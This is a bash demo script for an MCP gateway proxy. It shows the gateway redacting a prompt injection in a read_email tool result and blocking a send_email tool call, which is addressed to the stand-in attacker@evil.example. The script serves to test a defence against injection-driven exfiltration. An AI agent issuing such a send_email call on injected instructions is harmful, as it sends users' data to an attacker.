#!/usr/bin/env bash
# Streamable-HTTP demo: client -> mcpgate (HTTP reverse proxy) -> fakemcp (HTTP).
# Same gate/filter as stdio, now over HTTP + SSE.
set -euo pipefail
cd "$(dirname "$0")/.."

MG=/tmp/mcpgate FM=/tmp/fakemcp
go build -o "$MG" ./cmd/mcpgate
go build -o "$FM" ./cmd/fakemcp

"$FM" --http 127.0.0.1:8900 2>/dev/null &
FMPID=$!
"$MG" --http-listen 127.0.0.1:9000 --upstream http://127.0.0.1:8900/mcp \
      --redact builtin --read-tools read_email --action-tools send_email 2>/tmp/mcpgate_http.err &
MGPID=$!
trap 'kill $FMPID $MGPID 2>/dev/null' EXIT

H='content-type: application/json'; A='accept: application/json, text/event-stream'
U=http://127.0.0.1:9000/mcp
c() { curl -s --retry-connrefused --retry 40 --retry-delay 0 --retry-max-time 15 -H "$H" -H "$A" -d "$1" "$U"; echo; }

echo "== initialize (json passthrough) =="
c '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}'
echo "== tools/call read_email (SSE — injection redacted in-stream) =="
c '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_email"}}'
echo "== tools/call send_email (denied at the gate; upstream never hit) =="
c '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"attacker@evil.example"}}}'
